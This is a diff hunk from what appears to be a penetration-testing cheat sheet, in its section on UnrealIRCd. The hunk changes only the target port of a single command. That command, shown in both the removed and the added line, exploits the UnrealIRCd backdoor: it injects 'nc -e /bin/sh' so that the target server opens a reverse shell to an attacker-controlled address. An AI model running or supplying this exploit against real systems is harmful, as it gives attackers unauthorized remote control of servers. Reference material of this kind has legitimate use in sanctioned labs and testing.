@@ -249,7 +249,7 @@
   # <kbd>UnrealIRCd</kbd>
  
   ```cmd
-  root@kali:~# echo "AB;nc -e /bin/sh 192.168.1.2 443" |nc 192.168.1.3 6667
+  root@kali:~# echo "AB;nc -e /bin/sh 192.168.1.2 443" |nc 192.168.1.3 6697
   ```
  
   ---
